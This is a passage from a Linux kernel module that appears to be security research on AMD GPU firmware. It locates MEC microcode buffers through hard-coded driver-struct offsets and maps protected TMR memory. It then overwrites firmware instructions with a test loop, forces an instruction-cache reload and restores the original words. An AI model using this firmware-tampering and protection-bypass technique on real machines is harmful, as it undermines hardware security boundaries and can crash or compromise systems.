			for (t = 0; t < 5; t++) {
				u32 v = vram_read32(test_addrs[t]);
				pr_info("fw36: VRAM[%s] (0x%llX) = 0x%08X%s\n",
					test_names[t], test_addrs[t], v,
					v == 0xFFFFFFFF ? " (PROTECTED)" :
					(v == 0 ? " (ZERO)" : ""));
			}
		}

		/* Test 2: Scan GART page table for any entry mapping near IC_BASE.
		 * GART kptr = adev+0x3B900, covers GART VA range.
		 * Each PTE is 8 bytes. GART range = 0x7FFF00000-0x7FFF1FFFF.
		 * Number of PTEs = (PT_END - PT_START + 1) / 4096 = 0x20 = 32 pages. */
		pr_info("fw36: --- GART Page Table Dump ---\n");
		{
			u64 gart_kptr = *(u64 *)((u8 *)adev + 0x3B900);
			int i;
			if (gart_kptr && (gart_kptr >> 48) == 0xFFFF) {
				for (i = 0; i < 64; i++) {
					u64 pte;
					copy_from_kernel_nofault(&pte,
						(void *)(unsigned long)(gart_kptr + i * 8), 8);
					if (pte != 0) {
						u64 phys = (pte >> 12) << 12;
						int valid = pte & 1;
						int system = (pte >> 1) & 1;
						pr_info("fw36: GART PTE[%d]: 0x%016llX → phys=0x%llX v=%d sys=%d\n",
							i, pte, phys, valid, system);
					}
				}
			}
		}

		/* Test 3: Search adev for firmware GPU VA info.
		 * The driver stores mec_fw GPU VA in adev->gfx.mec struct.
		 * Look for values near IC_BASE (0x20681D4000) in the adev range
		 * around the MEC fields (0x3B800-0x3BC00). */
		pr_info("fw36: --- Search adev for IC_BASE-related values ---\n");
		{
			int off;
			for (off = 0x3B800; off < 0x3BC00; off += 8) {
				u64 val = *(u64 *)((u8 *)adev + off);
				/* Look for values that match IC_BASE components */
				if (val == ic_base_va ||
				    val == (ic_base_va >> 2) ||
				    val == (ic_base_va & 0xFFFFFFFF) ||
				    (val > 0x20000000000ULL && val < 0x21000000000ULL)) {
					pr_info("fw36: adev+0x%X = 0x%llX (IC_BASE match!)\n",
						off, val);
				}
			}

			/* Also search for the firmware GPU offset value.
			 * IC_BASE = fw_gpu_addr >> 2 (word-addressed).
			 * So fw_gpu_addr = IC_BASE << 2 = 0x81A0750000 */
			{
				u64 fw_gpu = ic_base_va << 2;
				pr_info("fw36: IC_BASE << 2 = 0x%llX (possible fw GPU addr)\n",
					fw_gpu);
				for (off = 0x3B800; off < 0x3BC00; off += 8) {
					u64 val = *(u64 *)((u8 *)adev + off);
					if (val == fw_gpu) {
						pr_info("fw36: *** FOUND fw_gpu_addr at adev+0x%X! ***\n",
							off);
					}
				}

				/* IC_BASE might be byte-addressed already (not >> 2).
				 * In that case, the VRAM offset = IC_BASE - FB_BASE.
				 * Or IC_BASE is a TMR-relative address. */
				{
					u64 tmr_bo_mc = 0x97E0000000ULL;
					if (ic_base_va > tmr_bo_mc) {
						u64 tmr_off = ic_base_va - tmr_bo_mc;
						pr_info("fw36: IC_BASE - TMR_BO = 0x%llX (%llu KB)\n",
							tmr_off, tmr_off >> 10);
					}
				}
			}
		}

		/* Test 4: Scan the VMID0 page table via PCI BAR.
		 * PT_BASE = 0x207FB00001 → MC = 0x207FB00000.
		 * Wait — 0x207FB00000 doesn't look like a valid MC address.
		 * It might be that the GFXHUB page table BASE register
		 * stores a GPU-physical address, not an MC address.
		 * Let me try treating it as VRAM offset:
		 * 0x207FB00000 - 0x8000000000 = 0x187FB00000 (beyond VRAM)
		 * 0x7FB00000 (just low 32 bits) = 2,143,289,344 ≈ 2GB offset.
		 * Could the page table be at VRAM+0x7FB00000? */
		pr_info("fw36: --- VMID0 PT via VRAM read ---\n");
		{
			u32 pt_base_lo = rr(gc_base0 + 0x168F);
			u64 pt_mc;
			/* Try PT_BASE_LO as VRAM offset (clear valid bit) */
			pt_mc = 0x8000000000ULL + ((u64)(pt_base_lo & ~1UL) << 12);
			{
				u32 v = vram_read32(pt_mc);
				pr_info("fw36: PT at MC 0x%llX (VRAM+0x%llX): 0x%08X%s\n",
					pt_mc, pt_mc - 0x8000000000ULL, v,
					v == 0xFFFFFFFF ? " (PROTECTED)" : "");
			}
			/* Also try without shift */
			pt_mc = 0x8000000000ULL + (pt_base_lo & ~1UL);
			{
				u32 v = vram_read32(pt_mc);
				pr_info("fw36: PT at MC 0x%llX (VRAM+0x%llX): 0x%08X%s\n",
					pt_mc, pt_mc - 0x8000000000ULL, v,
					v == 0xFFFFFFFF ? " (PROTECTED)" : "");
			}
		}

		/* Test 5: Look at how the driver programs IC_BASE.
		 * From gfx_v12_0_cp_compute_load_microcode_rs64():
		 *   WREG32_SOC15(GC, 0, regCP_CPC_IC_BASE_LO,
		 *     lower_32_bits(addr));
		 * where addr = adev->gfx.mec.mec_fw_data_gpu_addr >> 2
		 * Note the >> 2! IC_BASE is WORD-ADDRESSED!
		 *
		 * So the actual byte address = IC_BASE << 2 = 0x81A0750000.
		 * Is 0x81A0750000 in the VRAM range?
		 * FB_BASE = 0x8000000000, FB_TOP = 0x97FF000000.
		 * 0x81A0750000 IS in VRAM! Offset = 0x1A0750000 = ~6.5GB */
		{
			u64 fw_byte_addr = ic_base_va << 2;
			u64 fw_vram_off = fw_byte_addr - 0x8000000000ULL;
			u32 v;

			pr_info("fw36: IC_BASE (word-addr) = 0x%llX\n", ic_base_va);
			pr_info("fw36: FW byte addr (IC_BASE << 2) = 0x%llX\n",
				fw_byte_addr);
			pr_info("fw36: FW VRAM offset = 0x%llX (%llu MB)\n",
				fw_vram_off, fw_vram_off >> 20);

			/* Check if this is in TMR range */
			if (fw_byte_addr >= 0x97E0000000ULL &&
			    fw_byte_addr < 0x988C000000ULL) {
				pr_info("fw36: *** FW ADDR IS IN TMR BO! ***\n");
				pr_info("fw36: TMR BO offset = 0x%llX\n",
					fw_byte_addr - 0x97E0000000ULL);
			}

			/* Try to read the firmware code at this address */
			v = vram_read32(fw_byte_addr);
			pr_info("fw36: VRAM[FW_ADDR] = 0x%08X%s (expect 0x04070663 for PC=0)\n",
				v, v == 0xFFFFFFFF ? " (PROTECTED)" : "");

			/* If protected, try the TMR ioremap window */
			if (v == 0xFFFFFFFF) {
				u64 tmr_kptr = *(u64 *)((u8 *)adev + 0x3B928);
				u64 tmr_mc   = *(u64 *)((u8 *)adev + 0x3B920 + 8);
				u64 tmr_size = 0x85D000;

				if (fw_byte_addr >= tmr_mc &&
				    fw_byte_addr < tmr_mc + tmr_size) {
					u64 off = fw_byte_addr - tmr_mc;
					u32 code;
					copy_from_kernel_nofault(&code,
						(void *)(unsigned long)(tmr_kptr + off), 4);
					pr_info("fw36: TMR ioremap at FW_ADDR: 0x%08X\n", code);
				} else {
					pr_info("fw36: FW_ADDR not in TMR ioremap (mc=0x%llX+0x%llX)\n",
						tmr_mc, tmr_size);
				}
			}

			/* Also check: what does the firmware look like at
			 * fw_byte_addr + 0x4A7*4 (= the current PC location)? */
			{
				u32 pc = rr(regCP_MEC1_INSTR_PNTR);
				u64 pc_addr = fw_byte_addr + (u64)pc * 4;
				u32 pc_val = vram_read32(pc_addr);
				pr_info("fw36: VRAM[FW+PC*4] (0x%llX, PC=0x%X) = 0x%08X\n",
					pc_addr, pc, pc_val);
			}
		}

		/* Test 6: Check if the firmware BO at adev+0x3BAC0
		 * (mc=0x80007EE000) is what IC_BASE points to.
		 * IC_BASE << 2 = 0x81A0750000. FW BO mc = 0x80007EE000.
		 * These don't match. So the BO at 0x3BAC0 is NOT what IC fetches from.
		 * But let's verify by reading at the FW BO GPU addr >> 2 */
		{
			u64 fw_bo_mc = *(u64 *)((u8 *)adev + 0x3BAC0 + 8);
			pr_info("fw36: FW BO mc = 0x%llX, >> 2 = 0x%llX\n",
				fw_bo_mc, fw_bo_mc >> 2);
			pr_info("fw36: IC_BASE    = 0x%llX (these should match if BO=IC source)\n",
				ic_base_va);
		}

		/* Test 7: Deeper adev scan for mec_fw_data_gpu_addr.
		 * The driver stores:
		 *   adev->gfx.mec.mec_fw_data_gpu_addr = bo GPU offset
		 * And IC_BASE = this value >> 2.
		 * So the stored value should be IC_BASE << 2. */
		{
			u64 target = ic_base_va << 2;
			int off;
			pr_info("fw36: Searching adev for mec_fw_data_gpu_addr = 0x%llX...\n",
				target);
			for (off = 0; off < 0x80000; off += 8) {
				u64 val = *(u64 *)((u8 *)adev + off);
				if (val == target) {
					pr_info("fw36: *** FOUND at adev+0x%X = 0x%llX ***\n",
						off, val);
					/* Read surrounding context */
					{
						int j;
						for (j = -4; j <= 4; j++) {
							u64 ctx = *(u64 *)((u8 *)adev + off + j * 8);
							pr_info("fw36:   adev+0x%X = 0x%llX\n",
								off + j * 8, ctx);
						}
					}
				}
			}
		}
	}

	/*
	 * PHASE 23: FIRMWARE BO DIRECT PATCH VIA KNOWN CPU POINTER
	 *
	 * From gfx_v12_0_cp_compute_load_microcode_rs64():
	 *   - Firmware is memcpy'd to a VRAM BO (NO PSP VALIDATION!)
	 *   - IC_BASE = mec_fw_gpu_addr (byte address, NOT word-addressed)
	 *   - BO struct at adev->gfx.mec.mec_fw_obj
	 *   - GPU addr at adev->gfx.mec.mec_fw_gpu_addr = IC_BASE
	 *
	 * Plan: Find mec_fw_gpu_addr in adev, get BO ptr, kmap, patch!
	 */
	pr_info("fw36: ========== PHASE 23: FW BO DIRECT PATCH ==========\n");
	{
		/* Use known CPU pointer at adev+0x3BAC0 (confirmed VRAM-coherent).
		 * This BO has mc=0x80007EE000, cpu=kptr. Verify it contains firmware
		 * by reading PC=0 and comparing with known firmware blob pattern.
		 * Also search for mec_fw_gpu_addr with wider scan range. */

		u64 fw_bo_cpu = *(u64 *)((u8 *)adev + 0x3BAC0 + 16);
		u64 fw_bo_mc  = *(u64 *)((u8 *)adev + 0x3BAC0 + 8);
		u64 ic_base_va = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
		                 rr(regCP_CPC_IC_BASE_LO);
		u32 pc_cur = rr(regCP_MEC1_INSTR_PNTR);

		pr_info("fw36: FW BO cpu=0x%llX mc=0x%llX\n", fw_bo_cpu, fw_bo_mc);
		pr_info("fw36: IC_BASE=0x%llX PC=0x%04X\n", ic_base_va, pc_cur);

		if (fw_bo_cpu && (fw_bo_cpu >> 48) == 0xFFFF) {
			u32 code[4];
			int i;

			/* Read PC=0 from CPU pointer */
			for (i = 0; i < 4; i++)
				copy_from_kernel_nofault(&code[i],
					(void *)(unsigned long)(fw_bo_cpu + i * 4), 4);
			pr_info("fw36: BO[PC=0]: %08X %08X %08X %08X\n",
				code[0], code[1], code[2], code[3]);
			pr_info("fw36: Expected: 04070663 00060663 6F826583 3CB22023\n");

			if (code[0] == 0x04070663 && code[1] == 0x00060663) {
				pr_info("fw36: *** FIRMWARE CONFIRMED IN BO! ***\n");

				/* Read at PC=0x4A7 and PC=0x800 */
				{
					u32 at_4a7, at_800;
					copy_from_kernel_nofault(&at_4a7,
						(void *)(unsigned long)(fw_bo_cpu + 0x4A7 * 4), 4);
					copy_from_kernel_nofault(&at_800,
						(void *)(unsigned long)(fw_bo_cpu + 0x800 * 4), 4);
					pr_info("fw36: BO[0x4A7]=0x%08X (expect 0x00100393)\n", at_4a7);
					pr_info("fw36: BO[0x800]=0x%08X (expect 0x00D67633)\n", at_800);
				}

				/* Read at current PC */
				{
					u32 at_pc;
					copy_from_kernel_nofault(&at_pc,
						(void *)(unsigned long)(fw_bo_cpu + pc_cur * 4), 4);
					pr_info("fw36: BO[PC=0x%X]=0x%08X\n", pc_cur, at_pc);
				}

				/* ============ THE PATCH ============ */
				pr_info("fw36: === PATCHING FIRMWARE BO ===\n");
				{
					/* Patch strategy: at PC=0x800 (PRGRM_CNTR_START),
					 * write a small stub that writes a marker to scratch reg.
					 *
					 * RS64 custom CSR for scratch:
					 *   CSRRW x0, 0xF00, x1 → write x1 to CSR 0xF00
					 *   But we don't know the scratch CSR number.
					 *
					 * Simpler: write NOP sled ending with JAL-to-self
					 * at entry point. If MEC PC changes to 0x800 or nearby
					 * after IC reload, we know the patch worked. */

					u32 orig_800, orig_801, orig_802, orig_803;
					u32 rb;

					copy_from_kernel_nofault(&orig_800,
						(void *)(unsigned long)(fw_bo_cpu + 0x800 * 4), 4);
					copy_from_kernel_nofault(&orig_801,
						(void *)(unsigned long)(fw_bo_cpu + 0x801 * 4), 4);
					copy_from_kernel_nofault(&orig_802,
						(void *)(unsigned long)(fw_bo_cpu + 0x802 * 4), 4);
					copy_from_kernel_nofault(&orig_803,
						(void *)(unsigned long)(fw_bo_cpu + 0x803 * 4), 4);

					pr_info("fw36: Orig [0x800-803]: %08X %08X %08X %08X\n",
						orig_800, orig_801, orig_802, orig_803);

					/* Patch: LUI x7, 0xCAFE0 (0xCAFE00B7 → wait, x7=0b00111)
					 * LUI rd, imm → imm[31:12] rd 0110111
					 * LUI x7, 0xCAFE0: imm=0xCAFE0, rd=7=00111
					 * = 0xCAFE0 << 12 | 7 << 7 | 0b0110111
					 * = CAFE0000 | 00000380 | 37
					 * = 0xCAFE03B7
					 * Then: ADDI x7, x7, 0x123 → 0x12338393
					 *
					 * Actually just use simpler instructions:
					 * Write 0xDEAD to scratch via known mechanism.
					 * MEC scratch 0 is at gc_base0+0x3460.
					 * RS64 firmware writes to it via MMIO-like instructions.
					 *
					 * For now, just write a distinctive infinite loop:
					 * NOP (0x00000013)
					 * NOP
					 * NOP
					 * JAL x0, -12 (jump back to first NOP)
					 * = 0xFF5FF06F (JAL x0, -12)
					 */
					{
						u32 patch[4] = {
							0x00000013, /* NOP */
							0x00000013, /* NOP */
							0x00000013, /* NOP */
							0xFF5FF06F, /* JAL x0, -12 (back to first NOP) */
						};

						for (i = 0; i < 4; i++)
							copy_to_kernel_nofault(
								(void *)(unsigned long)(fw_bo_cpu + (0x800 + i) * 4),
								&patch[i], 4);
						mb();
						udelay(500);

						/* Verify write */
						copy_from_kernel_nofault(&rb,
							(void *)(unsigned long)(fw_bo_cpu + 0x800 * 4), 4);
						pr_info("fw36: BO[0x800] after patch = 0x%08X %s\n",
							rb, rb == 0x00000013 ? "*** PATCHED! ***" : "FAIL");

						if (rb == 0x00000013) {
							u32 rs64_cntl_save = rr(regCP_MEC_RS64_CNTL);

							pr_info("fw36: === DRIVER IC RELOAD SEQUENCE ===\n");

							/* Halt MEC */
							wr(regCP_MEC_CNTL, (1 << 30));
							udelay(2000);
							pr_info("fw36: Halted PC=0x%04X\n",
								rr(regCP_MEC1_INSTR_PNTR));

							/* IC_BASE_CNTL: VMID=0, EXE_DISABLE=0 */
							{
								u32 cntl = rr(gc_base0 + 0x2816);
								cntl &= ~0xF; /* clear VMID */
								cntl &= ~(1 << 23); /* EXE_DISABLE=0 */
								cntl &= ~(7 << 24); /* CACHE_POLICY=0 */
								wr(gc_base0 + 0x2816, cntl);
								pr_info("fw36: IC_BASE_CNTL = 0x%08X\n",
									rr(gc_base0 + 0x2816));
							}

							/* DC_BASE_CNTL */
							{
								u32 cntl = rr(gc_base0 + 0x2818);
								cntl &= ~0xF; /* VMID=0 */
								cntl &= ~(7 << 24); /* CACHE_POLICY=0 */
								wr(gc_base0 + 0x2818, cntl);
							}

							/* Invalidate DC */
							{
								u32 dc_op = rr(gc_base0 + 0x2817);
								wr(gc_base0 + 0x2817, dc_op | 1);
								udelay(2000);
								{
									int w;
									for (w = 0; w < 10000; w++) {
										u32 v = rr(gc_base0 + 0x2817);
										if (v & 2) break;
										udelay(1);
									}
									pr_info("fw36: DC inv done after %d us\n", w);
								}
							}

							/* Invalidate IC */
							{
								u32 ic_op = rr(regCP_CPC_IC_OP_CNTL);
								wr(regCP_CPC_IC_OP_CNTL, ic_op | 1);
								udelay(2000);
								{
									int w;
									for (w = 0; w < 10000; w++) {
										u32 v = rr(regCP_CPC_IC_OP_CNTL);
										if (v & 2) break;
										udelay(1);
									}
									pr_info("fw36: IC inv done after %d us\n", w);
								}
							}

							/* Set PRGRM_CNTR_START = 0x800 */
							wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x800);
							udelay(100);
							pr_info("fw36: PRGRM_CNTR_START set to 0x800\n");

							/* Pipe reset */
							wr(regCP_MEC_RS64_CNTL, rs64_cntl_save | 0xF0000);
							udelay(1000);
							wr(regCP_MEC_RS64_CNTL, rs64_cntl_save & ~0xF0000);
							udelay(1000);

							/* Unhalt */
							wr(regCP_MEC_CNTL, 0);
							mdelay(50);

							{
								u32 new_pc = rr(regCP_MEC1_INSTR_PNTR);
								pr_info("fw36: *** POST-PATCH PC = 0x%04X ***\n",
									new_pc);
								if (new_pc >= 0x800 && new_pc <= 0x803)
									pr_info("fw36: *** MEC EXECUTING PATCHED CODE AT 0x%X! ***\n",
										new_pc);
								else if (new_pc != pc_orig)
									pr_info("fw36: PC CHANGED: 0x%04X → 0x%04X\n",
										pc_orig, new_pc);
								else
									pr_info("fw36: PC unchanged at 0x%04X\n", pc_orig);
							}

							/* Check scratch regs */
							{
								int s;
								for (s = 0; s < 8; s++) {
									u32 v = rr(gc_base0 + 0x3460 + s);
									pr_info("fw36: SCRATCH_%d = 0x%08X\n", s, v);
								}
							}

							/* Halt before restore */
							wr(regCP_MEC_CNTL, (1 << 30));
							udelay(2000);
						}

						/* RESTORE original firmware */
						copy_to_kernel_nofault(
							(void *)(unsigned long)(fw_bo_cpu + 0x800 * 4),
							&orig_800, 4);
						copy_to_kernel_nofault(
							(void *)(unsigned long)(fw_bo_cpu + 0x801 * 4),
							&orig_801, 4);
						copy_to_kernel_nofault(
							(void *)(unsigned long)(fw_bo_cpu + 0x802 * 4),
							&orig_802, 4);
						copy_to_kernel_nofault(
							(void *)(unsigned long)(fw_bo_cpu + 0x803 * 4),
							&orig_803, 4);
						mb();
						udelay(200);

						copy_from_kernel_nofault(&rb,
							(void *)(unsigned long)(fw_bo_cpu + 0x800 * 4), 4);
						pr_info("fw36: Restored [0x800]=0x%08X %s\n",
							rb, rb == orig_800 ? "OK" : "FAIL");

						/* Re-do IC reload with original firmware */
						{
							u32 ic_op = rr(regCP_CPC_IC_OP_CNTL);
							wr(regCP_CPC_IC_OP_CNTL, ic_op | 1);
							udelay(2000);
						}

						/* Unhalt */
						wr(regCP_MEC_CNTL, 0);
						wr(regCP_MEC_RS64_CNTL,
							rr(regCP_MEC_RS64_CNTL) & ~(1 << 30));
						udelay(2000);
					}
				}
			} else {
				pr_info("fw36: BO does NOT contain firmware at PC=0\n");
				pr_info("fw36: Got %08X instead of 04070663\n", code[0]);

				/* Try the BO at adev+0x3BAD8 instead */
				{
					u64 alt_cpu = *(u64 *)((u8 *)adev + 0x3BAD8 + 16);
					if (alt_cpu && (alt_cpu >> 48) == 0xFFFF) {
						copy_from_kernel_nofault(&code[0],
							(void *)(unsigned long)alt_cpu, 4);
						pr_info("fw36: Alt BO [0]=0x%08X\n", code[0]);
					}
				}

				/* Search wider for mec_fw_gpu_addr */
				pr_info("fw36: Searching adev 0-1MB for 0x%llX...\n", ic_base_va);
				{
					int off;
					for (off = 0; off < 0x100000; off += 8) {
						u64 val = *(u64 *)((u8 *)adev + off);
						if (val == ic_base_va) {
							pr_info("fw36: *** FOUND at adev+0x%X ***\n", off);
							/* Context dump */
							{
								int j;
								for (j = -2; j <= 4; j++) {
									u64 c = *(u64 *)((u8 *)adev + off + j * 8);
									pr_info("fw36:   [+0x%X] = 0x%016llX\n",
										off + j * 8, c);
								}
							}
							break;
						}
					}
				}
			}
		} else {
			pr_info("fw36: FW BO CPU ptr invalid\n");
		}

		pr_info("fw36: Final PC after P23 = 0x%04X\n",
			rr(regCP_MEC1_INSTR_PNTR));
	}

	/*
	 * PHASE 24: PHYSICAL ADDRESS DISCOVERY + TMR BO MAPPING
	 *
	 * We know the TMR ioremap kptr (adev+0x3B928). Find its physical
	 * address to derive the MC→physical mapping. Then ioremap the
	 * TMR BO (0x97E0000000) to find and patch the firmware.
	 */
	pr_info("fw36: ========== PHASE 24: PHYS ADDR DISCOVERY ==========\n");
	{
		/* Read both values and identify which is kptr vs mc */
		u64 tmr_val0 = *(u64 *)((u8 *)adev + 0x3B920);
		u64 tmr_val1 = *(u64 *)((u8 *)adev + 0x3B928);
		u64 tmr_kptr, tmr_mc;
		u64 tmr_bo_mc = 0x97E0000000ULL;
		u64 fb_base_mc = 0x8000000000ULL;

		/* kptr has 0xFFFF prefix, mc does not */
		if ((tmr_val0 >> 48) == 0xFFFF) {
			tmr_kptr = tmr_val0;
			tmr_mc = tmr_val1;
		} else if ((tmr_val1 >> 48) == 0xFFFF) {
			tmr_kptr = tmr_val1;
			tmr_mc = tmr_val0;
		} else {
			tmr_kptr = 0;
			tmr_mc = 0;
		}
		pr_info("fw36: TMR val0=0x%llX val1=0x%llX\n", tmr_val0, tmr_val1);
		pr_info("fw36: TMR kptr=0x%llX mc=0x%llX\n", tmr_kptr, tmr_mc);

		if (!tmr_kptr || (tmr_kptr >> 48) != 0xFFFF) {
			pr_info("fw36: No valid TMR kptr found, skipping P24\n");
			goto phase24_done;
		}

		/* Method 1: Use slow_virt_to_phys() to find physical address
		 * of the TMR ioremap kptr. This works for ioremap'd addresses. */
		{
			phys_addr_t tmr_phys = slow_virt_to_phys((void *)(unsigned long)tmr_kptr);
			pr_info("fw36: TMR ioremap phys = 0x%llX\n", (u64)tmr_phys);

			if (tmr_phys != 0 && tmr_phys != ~0ULL) {
				/* Derive MC→physical mapping:
				 * tmr_phys = aper_base + (tmr_mc - fb_base_mc)
				 * aper_base = tmr_phys - (tmr_mc - fb_base_mc) */
				u64 mc_offset = tmr_mc - fb_base_mc;
				u64 aper_base = tmr_phys - mc_offset;
				u64 tmr_bo_offset = tmr_bo_mc - fb_base_mc;
				u64 tmr_bo_phys = aper_base + tmr_bo_offset;

				pr_info("fw36: MC offset of TMR ioremap = 0x%llX\n", mc_offset);
				pr_info("fw36: Derived aper_base = 0x%llX\n", aper_base);
				pr_info("fw36: TMR BO MC offset = 0x%llX\n", tmr_bo_offset);
				pr_info("fw36: TMR BO phys = 0x%llX\n", tmr_bo_phys);

				/* Also compute IC_BASE physical address */
				{
					u64 ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
					              rr(regCP_CPC_IC_BASE_LO);
					/* IC_BASE is a GPU VA, not MC. But on APUs with
					 * VMID0 identity mapping through system aperture,
					 * GPU VA = MC address for VRAM range. */
					if (ic_base >= fb_base_mc && ic_base < 0x97FF000000ULL) {
						u64 ic_phys = aper_base + (ic_base - fb_base_mc);
						pr_info("fw36: IC_BASE phys (if MC addr) = 0x%llX\n",
							ic_phys);
					}
				}

				/* Map the TMR BO! */
				{
					void __iomem *tmr_bo_map;
					size_t map_size = 0x200000; /* 2MB at a time */

					pr_info("fw36: Mapping TMR BO at phys 0x%llX...\n",
						tmr_bo_phys);

					tmr_bo_map = ioremap_wc(tmr_bo_phys, map_size);
					if (tmr_bo_map) {
						u32 hdr[8];
						int i;
						u64 fw_offset = 0;
						int found_fw = 0;

						pr_info("fw36: *** TMR BO MAPPED! ***\n");
						for (i = 0; i < 8; i++)
							hdr[i] = readl(tmr_bo_map + i * 4);
						pr_info("fw36: TMR_BO[0]: %08X %08X %08X %08X\n",
							hdr[0], hdr[1], hdr[2], hdr[3]);
						pr_info("fw36: TMR_BO[16]: %08X %08X %08X %08X\n",
							hdr[4], hdr[5], hdr[6], hdr[7]);

						/* Search for firmware pattern (PC=0: 0x04070663) */
						for (fw_offset = 0;
						     fw_offset < map_size - 8 && !found_fw;
						     fw_offset += 4) {
							u32 v = readl(tmr_bo_map + fw_offset);
							if (v == 0x04070663) {
								u32 v1 = readl(tmr_bo_map + fw_offset + 4);
								if (v1 == 0x00060663) {
									pr_info("fw36: *** FW CODE at TMR_BO+0x%llX! ***\n",
										fw_offset);
									found_fw = 1;
								}
							}
						}

						if (!found_fw) {
							pr_info("fw36: FW not in first 2MB. Trying wider scan...\n");
							iounmap(tmr_bo_map);

							/* Map more of the TMR BO */
							map_size = 0x800000; /* 8MB */
							tmr_bo_map = ioremap_wc(tmr_bo_phys, map_size);
							if (tmr_bo_map) {
								for (fw_offset = 0x200000;
								     fw_offset < map_size - 8 && !found_fw;
								     fw_offset += 4) {
									u32 v = readl(tmr_bo_map + fw_offset);
									if (v == 0x04070663) {
										u32 v1 = readl(tmr_bo_map + fw_offset + 4);
										if (v1 == 0x00060663) {
											pr_info("fw36: *** FW CODE at TMR_BO+0x%llX! ***\n",
												fw_offset);
											found_fw = 1;
										}
									}
								}
								if (!found_fw)
									pr_info("fw36: FW not in first 8MB TMR BO\n");
							}
						}

						if (found_fw && tmr_bo_map) {
							/* PATCH THE FIRMWARE! */
							pr_info("fw36: === PATCHING FIRMWARE IN TMR BO ===\n");
							{
								u32 pc = rr(regCP_MEC1_INSTR_PNTR);
								u64 pc_off = fw_offset + pc * 4;
								u32 orig_pc, orig_800;
								u32 at_800_off = fw_offset + 0x800 * 4;

								orig_pc = readl(tmr_bo_map + pc_off);
								orig_800 = readl(tmr_bo_map + at_800_off);
								pr_info("fw36: TMR[FW+PC*4] (0x%llX) = 0x%08X\n",
									pc_off, orig_pc);
								pr_info("fw36: TMR[FW+0x800*4] (0x%llX) = 0x%08X\n",
									at_800_off, orig_800);

								/* Write NOP loop at entry point */
								writel(0x00000013, tmr_bo_map + at_800_off);
								writel(0x00000013, tmr_bo_map + at_800_off + 4);
								writel(0x00000013, tmr_bo_map + at_800_off + 8);
								writel(0xFF5FF06F, tmr_bo_map + at_800_off + 12);
								wmb();
								udelay(500);

								{
									u32 rb = readl(tmr_bo_map + at_800_off);
									pr_info("fw36: TMR[0x800] patched = 0x%08X %s\n",
										rb,
										rb == 0x00000013 ?
										"*** TMR PATCHED! ***" : "FAIL");
								}

								if (readl(tmr_bo_map + at_800_off) == 0x00000013) {
									/* IC reload */
									u32 rs64_save = rr(regCP_MEC_RS64_CNTL);
									wr(regCP_MEC_CNTL, (1 << 30));
									udelay(2000);

									/* IC/DC invalidate */
									wr(gc_base0 + 0x2817, rr(gc_base0 + 0x2817) | 1);
									udelay(2000);
									wr(regCP_CPC_IC_OP_CNTL, rr(regCP_CPC_IC_OP_CNTL) | 1);
									udelay(2000);

									wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x800);
									wr(regCP_MEC_RS64_CNTL, rs64_save | 0xF0000);
									udelay(1000);
									wr(regCP_MEC_RS64_CNTL, rs64_save & ~0xF0000);
									udelay(1000);
									wr(regCP_MEC_CNTL, 0);
									mdelay(50);

									{
										u32 new_pc = rr(regCP_MEC1_INSTR_PNTR);
										pr_info("fw36: *** POST-PATCH PC = 0x%04X ***\n",
											new_pc);
									}

									/* Halt and restore */
									wr(regCP_MEC_CNTL, (1 << 30));
									udelay(2000);
								}

								/* RESTORE */
								writel(orig_800, tmr_bo_map + at_800_off);
								wmb();
								udelay(200);
								pr_info("fw36: Restored TMR[0x800]\n");

								/* IC reload with original */
								wr(regCP_CPC_IC_OP_CNTL, rr(regCP_CPC_IC_OP_CNTL) | 1);
								udelay(2000);
								wr(regCP_MEC_CNTL, 0);
								udelay(2000);
							}
						}

						if (tmr_bo_map)
							iounmap(tmr_bo_map);
					} else {
						pr_info("fw36: TMR BO ioremap failed\n");
					}
				}
			} else {
				pr_info("fw36: slow_virt_to_phys returned 0 or ~0\n");
			}
		}

phase24_done:
		pr_info("fw36: Final PC after P24 = 0x%04X\n",
			rr(regCP_MEC1_INSTR_PNTR));
	}

	pr_info("fw36: === MODE 20 COMPLETE ===\n");
	pr_info("fw36: Final PC = 0x%04X (orig 0x%04X)\n",
		rr(regCP_MEC1_INSTR_PNTR), pc_orig);
	#undef GC0
}

/* Mode 10: Find MEC firmware in VRAM + try to read/patch it */
static void vram_fw_access(void *psp, void *adev)
{
	u64 ic_base, fb_base;
	u32 gc_base0;
	int off, found;

	pr_info("fw36: === MODE 10: VRAM FIRMWARE ACCESS ===\n");

	gc_base0 = find_gc_base0(adev);
	if (!gc_base0) return;

	#define GC0(r) (gc_base0 + (r))
	ic_base = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) | rr(regCP_CPC_IC_BASE_LO);
	fb_base = (u64)rr(GC0(0x1614)) << 24;
	pr_info("fw36: IC_BASE  = 0x%016llX\n", ic_base);
	pr_info("fw36: FB_BASE  = 0x%llX\n", fb_base);
	#undef GC0

	/* 1) Search adev for ALL VRAM-range gpu_addrs + their kptrs.
	 *    VRAM range = [0x8000000000, 0x97FF000000]. Also check 0x20XXXXXXXX
	 *    in case IC_BASE uses a different address space. */
	pr_info("fw36: === SCAN FOR FIRMWARE BOs ===\n");
	found = 0;
	for (off = 8; off < 0x80000 && found < 40; off += 8) {
		u64 gpu = *(u64 *)((u8 *)adev + off);
		/* VRAM range addresses (MC physical) */
		if ((gpu >= 0x8000000000ULL && gpu <= 0x97FF000000ULL &&
		     (gpu & 0xFFF) == 0) ||
		    gpu == ic_base) {
			u64 prev = *(u64 *)((u8 *)adev + off - 8);
			u64 next = *(u64 *)((u8 *)adev + off + 8);
			/* Check if prev or next is a kptr */
			u64 kaddr = 0;
			if ((next >> 48) == 0xFFFF && next != 0xFFFFFFFFFFFFFFFFULL)
				kaddr = next;
			else if ((prev >> 48) == 0xFFFF && prev != 0xFFFFFFFFFFFFFFFFULL)
				kaddr = prev;

			if (kaddr) {
				u32 hdr[4];
				if (copy_from_kernel_nofault(hdr, (void *)(unsigned long)kaddr, 16) == 0) {
					u64 vram_off = gpu - fb_base;
					const char *tag = "";
					if (gpu == ic_base) tag = " <-- IC_BASE";
					pr_info("fw36: adev+0x%X: GPU=0x%llX kaddr=0x%llX VRAM+0x%llX%s\n",
						off, gpu, kaddr, vram_off, tag);
					pr_info("fw36:   first16: %08X %08X %08X %08X\n",
						hdr[0], hdr[1], hdr[2], hdr[3]);
					found++;
				}
			}
		}
	}

	/* 2) Search specifically for mec_fw fields in adev->gfx.mec.
